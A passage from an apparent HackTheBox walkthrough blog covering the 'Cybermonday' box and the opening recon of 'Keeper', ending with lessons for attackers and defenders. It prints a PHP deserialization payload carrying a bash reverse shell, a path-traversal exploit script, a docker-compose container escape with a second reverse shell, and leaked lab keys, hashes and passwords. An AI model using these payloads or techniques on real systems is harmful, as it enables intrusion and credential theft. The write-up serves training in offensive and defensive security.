GET /home HTTP/1.1 Host: cybermonday.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://cybermonday.htb/login DNT: 1 Connection: close Cookie: XSRF-TOKEN=eyJpdiI6Ik9palZ2ekgzQmF6TWNoUmQ3NVlpb2c9PSIsInZhbHVlIjoiRlZNaGFYc0tjTUxkM0w1RjduTW1zOG1WcEY3ekZoZHNzT2xHWFNvUEhseVplZXd2QVhlY0ppR2FSd1lpYnZnekRXUlJoZWJLRWE0SFJJN0tGTHFqeDlmQjNxcHgvMm5RdkxxNzkra1lVdWdJUHpSbWd0UzJia3M5M2pDVWVyTHQiLCJtYWMiOiI3MjFlZTVmYzQyMzA2Y2Q4YTM0NmE4M2YzMGE3ODU5NjZkNTNlN2JlOTJlYjc0ZTA1NzA2MWY4YzUxYzYwMzIwIiwidGFnIjoiIn0%3D; cybermonday_session=eyJpdiI6IjZuRkM2N0hVSWQ4UlJxSERMWXcwQVE9PSIsInZhbHVlIjoiWlNrRkk4b0xZd3BmSG4rcjJpRXdZbWx0b2ZZWUt2TUlMSFZzNmNxVHp3bHVSYzlrbDVTUzlIVHd0ZnVkTGRGcWxjZGZCNnpnbnVaSmtxYXRuZXdjaVBKbXFiTXFaYm5QNWlZSXVURHNVWG1KVWV3bFhqUFZUSFpLYVp5cXlZMzUiLCJtYWMiOiJjYmYyMDNiZDhmODQ2N2MxMTk2NmZjOWMwMjFmMGI0NDgzOWM5YjE3Mjk3YWVkOTBlNzY2YTdhMjU2NWU0NmUxIiwidGFnIjoiIn0%3D Upgrade-Insecure-Requests: 1 Sec-GPC: 1 That cybermonday_session cookie decodes to this:
{&#34;iv&#34;:&#34;6nFC67HUId8RRqHDLYw0AQ==&#34;,&#34;value&#34;:&#34;ZSkFI8oLYwpfHn+r2iEwYmltofYYKvMILHVs6cqTzwluRc9kl5SS9HTwtfudLdFqlcdfB6zgnuZJkqatnewciPJmqbMqZbnP5iYIuTDsUXmJUewlXjPVTHZKaZyqyY35&#34;,&#34;mac&#34;:&#34;cbf203bd8f8467c11966fc9c021f0b44839c9b17297aed90e766a7a2565e46e1&#34;,&#34;tag&#34;:&#34;In0%3D Generated payload with this:
phpggc Monolog/RCE1 system &#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1&#39;&#34; -A | base64 -w 0 Which results in this:
TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e1M6OToiXDAwXDJhXDAwXDczXDZmXDYzXDZiXDY1XDc0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7UzoxMDoiXDAwXDJhXDAwXDY4XDYxXDZlXDY0XDZjXDY1XDcyIjtyOjI7UzoxMzoiXDAwXDJhXDAwXDYyXDc1XDY2XDY2XDY1XDcyXDUzXDY5XDdhXDY1IjtpOi0xO1M6OToiXDAwXDJhXDAwXDYyXDc1XDY2XDY2XDY1XDcyIjthOjE6e2k6MDthOjI6e2k6MDtTOjUwOiJcNjJcNjFcNzNcNjhcMjBcMmRcNjNcMjBcMjdcNjJcNjFcNzNcNjhcMjBcMmRcNjlcMjBcM2VcMjZcMjBcMmZcNjRcNjVcNzZcMmZcNzRcNjNcNzBcMmZcMzFcMzBcMmVcMzFcMzBcMmVcMzFcMzRcMmVcMzRcMmZcMzRcMzRcMzRcMzRcMjBcMzBcM2VcMjZcMzFcMjciO1M6NToiXDZjXDY1XDc2XDY1XDZjIjtOO319Uzo4OiJcMDBcMmFcMDBcNmNcNjVcNzZcNjVcNmMiO047UzoxNDoiXDAwXDJhXDAwXDY5XDZlXDY5XDc0XDY5XDYxXDZjXDY5XDdhXDY1XDY0IjtiOjE7UzoxNDoiXDAwXDJhXDAwXDYyXDc1XDY2XDY2XDY1XDcyXDRjXDY5XDZkXDY5XDc0IjtpOi0xO1M6MTM6IlwwMFwyYVwwMFw3MFw3Mlw2Zlw2M1w2NVw3M1w3M1w2Zlw3Mlw3MyI7YToyOntpOjA7Uzo3OiJcNjNcNzVcNzJcNzJcNjVcNmVcNzQiO2k6MTtTOjY6Ilw3M1w3OVw3M1w3NFw2NVw2ZCI7fX19Cg== Then used the script that BillieSimplish wrote. After running the script, I refreshed the page (http://cybermonday.htb/home) and immediately had a shell:
USER FLAG downloaded static nmap and did host discovery
curl -o nmap-portable.tar.gz http://10.10.14.4:8000/nmap-portable.tar.gz sha256sum nmap-portable.tar.gz tar -zxvf nmap-portable.tar.gz cd nmap-7.94SVN-x86-portable ./run-nmap.sh -sn 172.18.0.1/24 # host discovery REsults:
172.18.0.5 is cybermonday.htb 172.18.0.6 is webhooks-api-beta.cybermonday.htb
Established socks proxy over port 9999
Trying mysql on 172.18.0.7
proxychains mysql -u root -h 172.18.0.7 -p For copy-pasting, those are: $2y$10$6kJuFazZjtlrAvBNvg4bpO2fQSunL56QFbodCKG6.Qjw87Z8.fYnG $2y$10$jLCfpqJV4OvXV5o5EerUVOgEDdLMXPXMFvjXPxBw2evJI6j0Hisry
Admin hash is: $2y$10$Fx8Va.kBE1FO2mVhlWaoDulGdoo9XYKQFDmAPkOjqNyIAtDtUY0lC
Went back to my reverse shell to continue on with nmap. Going to scan for ports on the other hosts:
./run-nmap.sh -sC -sV -n -Pn --top-ports 4000 172.18.0.2-7 Port 5000?! Clearly the &ldquo;registry&rdquo; host is a private docker registry! I&rsquo;ll query the registry to see what repos are listed:
proxychains curl http://172.18.0.3:5000/v2/_catalog Only one result: {&quot;repositories&quot;:[&quot;cybermonday_api&quot;]}. Let&rsquo;s pull it
proxychains docker pull 172.18.0.3:5000/cybermonday_api:latest Hmm&hellip; nope. Instead of proxychains maybe I&rsquo;ll try forwarding just that one port specifically, using socat:
proxychains socat TCP-LISTEN:5000,fork,reuseaddr TCP:172.18.0.3:5000 Now I&rsquo;ll try again:
docker pull 172.18.0.3:5000/cybermonday_api:latest Still nothing. That&rsquo;s odd. Maybe I&rsquo;ll just try localhost?
Perfect! I wonder why that worked, when using the IP address did not.
It took forever, but I finally got it to pull down the .tar.gz files using DockerRegistryGrabber:
This resulted in a directory full of [hash].tar.gz files, called cybermonday_api. I merged them all into a filesystem using this:
mkdir fs cat cybermonday_api/*tar.gz | tar -xzf - -C fs -i I took a look through the filesystem that was produced. Nothing seemed very strange. I ran trufflehog over it:
Trufflehog found var/www/html/keys/private.pem. The corresponding public key is there too, and it matches the one that I derived earlier while forging my webhooks access token, so it&rsquo;s clear this is the signing key for the webhooks_api.
-----BEGIN PRIVATE KEY----- MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCm97O8AoI6DHCy LJXo9El8Yy6X5YFiivAUha51YqQZ6MzHeidRKUzw4Dc+OaEU0I//yMntYDaANryg /c3YnzMXJp2eu3Zd7n0V1wtdM/Ftt8ULRpMaQMg49lgnyRHRyXLR+JmJluDhUuzB iyHdKfv3siUhivpap9zpk+fWewSE6vA76pIPhDbgVVh5TGyfuknSg5Yc8P6q0Lmr cFHYz9LEGvFeH2+pw0EHdlFEDQfQUN1Xoun/zAljtEHx4xESBJ7jyveTsaURwIvB uzILKGeDKyAeyrrIlgzzYEvtXxCWfjbKKPUEzt8K7X0zURnBHl4nYeDfVmwrm5KF shNtGHXrAgMBAAECggEACgUhfy3zXMJ0XOz6DiHi6xkUqb73Nc+6urCPGLJTwM5M w8fb5i4BVQ9PoWdZ+GLP0XzeSWWVv7oJNewlV1OugDwsB2OepeJzFUVzhCNi4L+/ jn6sw02R9oEqJzEU5a8eOeWeaThpxHvyg2bzIE+ttF63hbzOa3RZeJcMub1mNwe9 k1WtXCCQewdLQEHgtmiZZruZHUVy284ALkw3u1Vvhgjiocjz2gEdAyMqDDFZaax+ ezTsK+Q3QpCSeuchFEvznTnWyEL33e8KW5rUPYYaGeGk0HRa5Y9Z78N2gXkmgmFr YTWx7sKOYZWW5hsL7I85bS9mkmLOjfhAHRNaectgaQKBgQDSrl0Vl58m8Bg5eQ/Q IoGdsEhGOrblvlMDJ+eLPmNxY9bpSEPvJOlvkiguVgEacTJnYJCWwkI6nFjLMK9q 592JuJHl3RuwgHerDZFDeBv4m6JZlp1XH+bUq7DaeQOpxR1fprpvysB4Rp4x14H4 zHP77rK5ux2O6QdhcyA1XKyQzQKBgQDK4idQeuTT0k/ZUYavm2cowoyN/QHqf3la U5oWf4e6QjuGxcIj9qGDmA1LZIzU5WgAsSNrVfyuo3A5ifcub5oaXVAcUP8ArkGA 6fs1C1AmyRaxLQo3uoDHNfRr3GTGmJ/MW4jfaYpS+GJE7z35u2BggJ7EFodNS4JJ VHnQMLdBlwKBgFZ9wLcxlOPuY3OM0MIYuG+dRD6YsidlWD0Ob89JYJfXbg49Xa5a z/6+2QIUysUpPZEVIqbRv1DCiO154joYUGnOvQ7KFCkExJwTqNQzBgCtHBx9acCv 1xruFV/LmIZk5ucy0o08hoGaNC2wFKqofOEroHIBcGQQJLiMA+gEUM/tAoGBALnC CWcJrpw3Mr7yg1QkAHb0ckbLAccYQh8u7qVszPQAEoqaZOASv91CCeIexUdkaC5C AgET8NBheq5kIPrWWg2LpH7YtjKEWhtToJr3qcJpWaqNZ46Q57n+L7XWTDr9oUo2 AQM1md3P6AHf3ynZoyuYeEVnryhZW4gSnZm+EPwvAoGBAMBXjE2nfBGZovvznYAj oYBNEs/wkjfrWPHqbydH/1++Sv1ewDjRvtafv1+eI3Js5MRHxBQaMjWzDlY+jqQV 1oaJgEc4QA1xBnplZsdfbVkbbSYsx8uBRmuLmEDofyZf/mrKNTsB7UcOlW4Nj59z My39wIl48oVs+ky/uL+35r9W -----END PRIVATE KEY----- It looks like all the source code for webhooks_api is in /var/www/html, so I&rsquo;ll check that out. I opened it all in Atom.
Checking out the app/routes/Router.php file showed something a little odd. Most of it is familiar, but there is one route that was undisclosed when querying the api earlier:
Very interesting. I&rsquo;ll have to dive into the source code and see how it works. The behaviour is outlined in app/controllers/LogsController.php. The file itself is a little long to show in this walkthrough, but here are my notes on the suspicious api endpoint:
POST /webhooks/:uuid/logs
comments: Must be performed on a uuid of a webhook using action &lsquo;createLogFile&rsquo; Requires x-api-key: 22892e36-1770-11ee-be56-0242ac120002 for authentication
arguments: action: possible values: list | read list: lists files in the directory of logs for that webhook read: reads the log specified with log_name log_name: filepath is based on webhook name: $logPath = &quot;/logs/{$webhook_find-&gt;name}/&quot;;
read does some checks on the file path:
first it checks for ../ and denies any path containing this. then, it strips out all spaces from the log_name then, it checks that the log_name contains &rsquo;log' then, it checks if /logs/{$webhook_find-&gt;name}/log_name exists finally, it reads the file and returns its contents Ok, this might be usable as an arbitrary file read. I just need to find a way to get past the filters:
(1) can be easily thwarted by putting spaces into the traversal, like . ./ The spaces will be stripped-out during step (2). (4) shouldn&rsquo;t be a problem. Just target known files, like /etc/passwd (3) is no problem. Just make sure the logs directory is in the path traversal. To use this, I wrote yet another function into my script:
def parseLOGS(token, uuid, cmd, verbose=False): endpoint = f&#39;/webhooks/{uuid}/logs&#39; action = &#39;read&#39; path = cmd if cmd.startswith(&#39;list&#39;) or cmd.startswith(&#39;read&#39;): action = cmd[:4] path = cmd[5:] log_name = f&#39;. ./. ./logs/. ./. ./. ./. ./. ./. ./. ./. ./. ./. ./. ./. ./. ./{path}&#39; resp = s.post( f&#39;{args.target}{endpoint}&#39;, headers = { &#39;x-access-token&#39;: token, &#39;x-api-key&#39;: &#39;22892e36-1770-11ee-be56-0242ac120002&#39; }, json = { &#39;action&#39;: action, &#39;log_name&#39;: log_name } ) if verbose or resp.status_code &gt; 299: print(f&#39;[{resp.status_code}] POST {endpoint}\\n{resp.text}\\nRequested:\\n\\t{resp.request.body}\\n&#39;) return try: data = resp.json()[&#39;message&#39;] print(f&#39;{data}\\n&#39;) except Exception as e: if verbose: print(f&#39;Encountered error while parsing response JSON:\\n{e}&#39;) sys.exit() I also modified the program flow in main a bit:
if m == &#34;LOGS&#34;: uuid = getWebhooks(token)[0][&#39;uuid&#39;] # Get the uuid of the first webhook elif m == &#34;SSRF&#34; or m == &#34;HTTP&#34;: try: uuid = createWebhook(test_token, f&#39;makerequest_{x}&#39;, &#39;webhook to make an http request&#39;, &#39;sendRequest&#39;, args.verbose) except: uuid = getExistingUuid(test_token, &#39;sendRequest&#39;, x, args.verbose) while True: try: if m == &#39;HTTP&#39;: cmd = input(&#39;SSRF &gt; &#39;) if cmd == &#39;&#39;: break parseHTTP(token, uuid, cmd, args.verbose) elif m == &#39;REDIS&#39;: cmd = input(&#39;REDIS &gt; &#39;) if cmd == &#39;&#39;: break parseREDIS(token, uuid, cmd, args.verbose) elif m == &#39;LOGS&#39;: cmd = input(&#39;LOGS &gt; &#39;) if cmd == &#39;&#39;: break And it works like a charm:
This works great for reading files on the box. But I have to know exactly what files to read. if I want to list out directory contents, I&rsquo;m going to need to do something else. For now, I&rsquo;ll enumerate important/common linux files (like /etc/passwd shown above). /etc/shadow has nothing in it, unfortunately. But check out the contents of /proc/self/environ:
HOSTNAME=e1862f4e1242 PHP_INI_DIR=/usr/local/etc/php HOME=/root PHP_LDFLAGS=-Wl,-O1 -pie PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 DBPASS=ngFfX2L71Nu PHP_VERSION=8.2.7 GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 PHP_ASC_URL=https://www.php.net/distributions/php-8.2.7.tar.xz.asc PHP_URL=https://www.php.net/distributions/php-8.2.7.tar.xz DBHOST=db DBUSER=dbuser PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin DBNAME=webhooks_api PHPIZE_DEPS=autoconf dpkg-dev file g++ gcc libc-dev make pkg-config re2c PWD=/var/www/html PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0 Alright! There&rsquo;s some new database credentials in there! MySQL / webhooks_api (dbuser : ngFfX2L71Nu)
The webhook_api application logic only lists files in the directory particular to that one webhook&rsquo;s name. And I can&rsquo;t use a directory traversal inside the webhook name, because the webhook name can only contain alphanumeric characters.
There is one way to get past this, though! By using the database that stores the webhooks. I can circumvent the data validation on the webhook name that the application enforces by going straight into the database and changing the webhook name there.
Just need to log into the DB again and change the webhook name manually
insert into webhooks (uuid, name, description, action) values (&#39;c87ae15e-be85-45ab-a2d3-7f198e215e14&#39;, &#39;../root&#39;, &#39;test&#39;, &#39;createLogFile&#39;); or UPDATE webhooks SET name = &#39;../../../../../../../etc&#39; WHERE uuid = &#39;c87ae15e-be85-45ab-a2d3-7f198e215e14&#39; But since I can already access the database&hellip; this password must be for credential re-use!
My box reset, so I had to redo host discovery:
Nmap scan report for 172.18.0.2 Host is up (0.0059s latency). Not shown: 3999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 3306/tcp open mysql MySQL 8.0.33 | mysql-info: | Protocol: 10 | Version: 8.0.33 | Thread ID: 60 | Capabilities flags: 65535 | Some Capabilities: FoundRows, Support41Auth, Speaks41ProtocolOld, ODBCClient, SupportsTransactions, IgnoreSigpipes, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, Speaks41ProtocolNew, InteractiveClient, ConnectWithDatabase, LongPassword, DontAllowDatabaseTableColumn, SupportsCompression, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults | Status: Autocommit | Salt: [\\\\x14R\\x1F_*xw=\\x16J\\x11qubor}% |_ Auth Plugin Name: caching_sha2_password |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=MySQL_Server_8.0.33_Auto_Generated_Server_Certificate | Not valid before: 2023-07-03T05:01:05 |_Not valid after: 2033-06-30T05:01:05 Nmap scan report for 172.18.0.3 Host is up (0.054s latency). Not shown: 3999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 9000/tcp open cslistener? Nmap scan report for 172.18.0.4 Host is up (0.0056s latency). Not shown: 3999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 6379/tcp open redis Redis key-value store 7.0.11 Nmap scan report for 172.18.0.5 Host is up (0.0010s latency). Not shown: 3999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 5000/tcp open http Docker Registry (API: 2.0) |_http-title: Site doesn&#39;t have a title. Nmap scan report for 172.18.0.6 Host is up (0.0026s latency). Not shown: 3999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http nginx 1.25.1 |_http-title: Did not follow redirect to http://cybermonday.htb |_http-server-header: nginx/1.25.1 Nmap scan report for 172.18.0.7 Host is up (0.0027s latency). Not shown: 3999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http PHP cli server 5.5 or later (PHP 8.2.7) |_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8). | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set So what user goes with that password? Maybe a username is leaked in any of the other hosts&rsquo; banners?
for (( i=2; i&lt;8; i++ )); do proxychains whatweb &#34;172.18.0.$i&#34;; curl -m 30 -IL &#34;172.18.0.$i&#34;; done Nope , no clues there. What about in redis?
proxychains redis-cli -h 172.18.0.4 -p 6379 &gt; CONFIG GET * Nothing interesting.
Oh&hellip;. duh. I had already seen this and just glossed-over it. I should have taken better notes the first time. The first thing I did when I got a reverse shell was look for the flag:
find / -name &#34;user.txt&#34; 2&gt;/dev/null Oddly enough, it was sitting in /mnt of all places&hellip; But what else is there?
Looks like the .ssh directory is traversible, and there&rsquo;s an authorized_keys file:
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCy9ETY9f4YGlxIufnXgnIZGcV4pdk94RHW9DExKFNo7iEvAnjMFnyqzGOJQZ623wqvm2WS577WlLFYTGVe4gVkV2LJm8NISndp9DG9l1y62o1qpXkIkYCsP0p87zcQ5MPiXhhVmBR3XsOd9MqtZ6uqRiALj00qGDAc+hlfeSRFo3epHrcwVxAd41vCU8uQiAtJYpFe5l6xw1VGtaLmDeyektJ7QM0ayUHi0dlxcD8rLX+Btnq/xzuoRzXOpxfJEMm93g+tk3sagCkkfYgUEHp6YimLUqgDNNjIcgEpnoefR2XZ8EuLU+G/4aSNgd03+q0gqsnrzX3Syc5eWYyC4wZ93f++EePHoPkObppZS597JiWMgQYqxylmNgNqxu/1mPrdjterYjQ26PmjJlfex6/BaJWTKvJeHAemqi57VkcwCkBA9gRkHi9SLVhFlqJnesFBcgrgLDeG7lzLMseHHGjtb113KB0NXm49rEJKe6ML6exDucGHyHZKV9zgzN9uY4ntp2T86uTFWSq4U2VqLYgg6YjEFsthqDTYLtzHer/8smFqF6gbhsj7cudrWap/Dm88DDa3RW3NBvqwHS6E9mJNYlNtjiTXyV2TNo9TEKchSoIncOxocQv0wcrxoxSjJx7lag9F13xUr/h6nzypKr5C8GGU+pCu70MieA8E23lWtw== john@cybermonday Alright, there&rsquo;s a user: john. Let&rsquo;s try that &ldquo;database&rdquo; password from earlier:
SUCCESS! &#x1f389;&#x1f389;&#x1f389; Wow that was so tough. I am so thankful to finally have a reliable way to reconnect without having to re-exploit the box if it resets &#x1f605; So it&rsquo;s now confirmed, valid SSH credentials are john : ngFfX2L71Nu
The SSH login drops you right into the /home/john, next to the flag. Just cat it out for the points:
cat user.txt ROOT FLAG User Enumeration: john Now that I finally have a stable SSH connection, I&rsquo;ll perform my usual user enumeration. In the interest of keeping this walkthrough as brief as possible, I&rsquo;ll omit the actual procedure of user enumeration and instead just jot down any notable results and findings. If you want to see the whole procedure, please check out my guide, User Enumeration: Linux.
The only notable remaining users are john and root. User john may run the following commands on localhost: (root) /opt/secure_compose.py *.yml john only owns /home/john. Nothing else. the group john additionally owns /var/lib/sudo/lectured/john. What is that? Available tools include nc, netcat, curl, wget, python3, perl. There is a strange port listening locally. I&rsquo;ll have to check it out &#x1f6a9; pspy revealed that the host is running docker-proxy: /usr/sbin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.18.0.6 -container-port 80 pspy also showed the docker registry starting up: registry serve /etc/docker/registry/config.yml But this file isnt actually present. However there is a file /etc/docker/key.json that is root only. Suspicious. It looks like the log files from webhooks_api were ending up in /home/john/logs/tests/: secure_compose.py In my experience, the absolute best way to find a PE vector is by finding something custom-built in sudo -l. On this box, john can sudo /opt/secure_compose.py *.yml. The python script can be read:
import sys, yaml, os, random, string, shutil, subprocess, signal def get_user(): return os.environ.get(&#34;SUDO_USER&#34;) def is_path_inside_whitelist(path): whitelist = [f&#34;/home/{get_user()}&#34;, &#34;/mnt&#34;] for allowed_path in whitelist: if os.path.abspath(path).startswith(os.path.abspath(allowed_path)): return True return False def check_whitelist(volumes): for volume in volumes: parts = volume.split(&#34;:&#34;) if len(parts) == 3 and not is_path_inside_whitelist(parts[0]): return False return True def check_read_only(volumes): for volume in volumes: if not volume.endswith(&#34;:ro&#34;): return False return True def check_no_symlinks(volumes): for volume in volumes: parts = volume.split(&#34;:&#34;) path = parts[0] if os.path.islink(path): return False return True def check_no_privileged(services): for service, config in services.items(): if &#34;privileged&#34; in config and config[&#34;privileged&#34;] is True: return False return True def main(filename): if not os.path.exists(filename): print(f&#34;File not found&#34;) return False with open(filename, &#34;r&#34;) as file: try: data = yaml.safe_load(file) except yaml.YAMLError as e: print(f&#34;Error: {e}&#34;) return False if &#34;services&#34; not in data: print(&#34;Invalid docker-compose.yml&#34;) return False services = data[&#34;services&#34;] if not check_no_privileged(services): print(&#34;Privileged mode is not allowed.&#34;) return False for service, config in services.items(): if &#34;volumes&#34; in config: volumes = config[&#34;volumes&#34;] if not check_whitelist(volumes) or not check_read_only(volumes): print(f&#34;Service &#39;{service}&#39; is malicious.&#34;) return False if not check_no_symlinks(volumes): print(f&#34;Service &#39;{service}&#39; contains a symbolic link in the volume, which is not allowed.&#34;) return False return True def create_random_temp_dir(): letters_digits = string.ascii_letters + string.digits random_str = &#39;&#39;.join(random.choice(letters_digits) for i in range(6)) temp_dir = f&#34;/tmp/tmp-{random_str}&#34; return temp_dir def copy_docker_compose_to_temp_dir(filename, temp_dir): os.makedirs(temp_dir, exist_ok=True) shutil.copy(filename, os.path.join(temp_dir, &#34;docker-compose.yml&#34;)) def cleanup(temp_dir): subprocess.run([&#34;/usr/bin/docker-compose&#34;, &#34;down&#34;, &#34;--volumes&#34;], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) shutil.rmtree(temp_dir) def signal_handler(sig, frame): print(&#34;\\nSIGINT received. Cleaning up...&#34;) cleanup(temp_dir) sys.exit(1) if __name__ == &#34;__main__&#34;: if len(sys.argv) != 2: print(f&#34;Use: {sys.argv[0]} &lt;docker-compose.yml&gt;&#34;) sys.exit(1) filename = sys.argv[1] if main(filename): temp_dir = create_random_temp_dir() copy_docker_compose_to_temp_dir(filename, temp_dir) os.chdir(temp_dir) signal.signal(signal.SIGINT, signal_handler) print(&#34;Starting services...&#34;) result = subprocess.run([&#34;/usr/bin/docker-compose&#34;, &#34;up&#34;, &#34;--build&#34;], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) print(&#34;Finishing services&#34;) cleanup(temp_dir) In the end, I finally found a way to write the yml file that would actually be parsed and spawn a shell:
version: &#39;3&#39; services: revshell_test: security_opt: - seccomp:unconfined - apparmor:unconfined cap_add: - ALL command: /bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/172.17.0.1/4444 0&gt;&amp;1&#34; image: cybermonday_api devices: - /dev/sda1:/dev/sda1 Now, try the good old &ldquo;mount the filesystem&rdquo; docker escape:
LESSONS LEARNED Attacker If you come across any stack traces, read them. Read them very carefully. Understand as much of the code as you can, within reason. Carefully reading the stack traces allowed me to identify a broken authentication mechanism. Sort your leads. On anything other than &ldquo;Very Easy&rdquo; boxes, you&rsquo;ll have multiple paths in front of you that you want to check out. It takes a bit of experience, but it is worth taking the time to categorize and sort all of your ideas. On this box, I made the mistake of trying to create malicious product images, when I had a big juicy waiting for me within /dashboard/changelog. Authentication bypass can be easy. If it seems like you can&rsquo;t find a way into some part of an HTB box that you know you need to access, run the authentication process through Burp and see if you can poke some holes in it. Or, for a more automated approach, try a tool such as Raider. Found a new subdomain? Check for secrets! When you find something like a .env file, this almost always leads directly to something important. At the very least, a .env file can serve as a useful reference to revisit every time you find another sensitive file, host, or API. Defender Turn off &ldquo;debug mode&rdquo;. When your project finally reaches production, you must turn off debug mode. Often, during development, it is useful to see as much detail as possible in stack traces and any status 500 pages from your API. However, after a project reaches production, it shouldn&rsquo;t be spewing out sensitive information about your codebase in this way. &#x1f60f; How about fixing all those errors even before your code hits prod? On this box, seeing a stack trace was enough to clearly identify a broken authentication mechanism.
Be really careful with coding API endpoints. This goes double for endpoints that allow for files to be written, however innocuous they may seem. If it is still unavoidable, ensure all inputs are very carefully sanitized and validated. Use an allow-listing approach in this case.
Least privilege is still important. Why was it necessary to allow a low-privilege user to perform a docker compose? As a developer, if you find yourself writing code to get around security controls or best practices, you&rsquo;re probably not acting in your own best interest (or you&rsquo;re a malware developer).
`,url:"https://4wayhandshake.github.io/walkthrough/cybermonday/"},"https://4wayhandshake.github.io/walkthrough/keeper/":{title:"Keeper",tags:["Default Credentials","SSRF","Danish","MySQL","Password Cracking","KeePass","PuTTY"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Currently, Keeper is still active. It was released as the ninth box for HTB&rsquo;s Hackers Clash: Open Beta Season II. Keeper is a very easy box, but with a few tricks up its sleeve. Personally, I found a few aspects of this box to be a little frustrating, but in retrospect those things that I found frustrating were probably the most realistic parts of the box. While it is marked as a Linux box, you&rsquo;ll need to have a beginner&rsquo;s grasp on some Windows tools to be able to escalate to root.
The foothold is deceptively easy, and had me going way off in the wrong direction for quite some time (although I did end up finding an alternate route to foothold, which is a little interesting). Proper use of OSINT goes a long way with this one. While Keeper is counts as a &ldquo;box&rdquo;, it plays a lot like a challenge: equal parts crypto and web. Keeper is the perfect box for anyone wanting a rapid introduction to HackTheBox - and I could definitely imagine HTB integrating this box into Starting Point later on.
RECON nmap scans For this box, I&rsquo;m running the same enumeration strategy as the previous boxes in the Open Beta Season II. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan.txt $RADDR Nmap scan report for 10.10.11.227 Host is up (0.17s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Is this one entirely web? To investigate a little further, I ran a script scan over the ports I just found:
sudo nmap -sV -sC -n -Pn -p22,80 -oN nmap/script-scan.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA) |_ 256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Just to be sure I got everything, I ran a script scan for the top 4000 most popular ports:
sudo nmap -sV -sC -n -Pn --top-ports 4000 -oN nmap/top-4000-ports.txt $RADDR # No new results Webserver Strategy Noting the redirect from the nmap scan, I added keeper.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=keeper.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Before I start enumerating, I&rsquo;ll take a quick look at the website. Navigating to the website http://keeper.htb shows only a link. It directs the user towards the tickets.keeper.htb subdomain:
This is a clear indication that there is a subdomain to watch out for: tickets.keeper.htb. To make sure that there isn&rsquo;t more than just tickets.keeper.htb, I performed vhost enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 80 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results. That&rsquo;s confusing: I thought for sure that keeper.htb would be a result. Did I make a mistake? I already know keeper.htb exists, so I checked for vhosts in the subdomain way
ffuf -w $WLIST -u http://$RADDR -H &#34;Host: FUZZ.keeper.htb&#34; -c -t 80 -o fuzzing/vhost-keeper.md -of md -timeout 4 -ic -ac -v [Status: 200, Size: 4236, Words: 407, Lines: 154, Duration: 201ms] | URL | http://10.10.11.227 * FUZZ: tickets Then I performed subdomain enumeration
ffuf -w $WLIST -u http://FUZZ.$DOMAIN/ -c -t 80 -o ./fuzzing/subdomain-$DOMAIN.md -of md -timeout 4 -ic -ac -mc 200,204,301,307,401,403,405,500,404 -v Same result as above: just tickets.keeper.htb. That&rsquo;s the expected result. I&rsquo;ll move on to directory enumeration on http://tickets.keeper.htb:
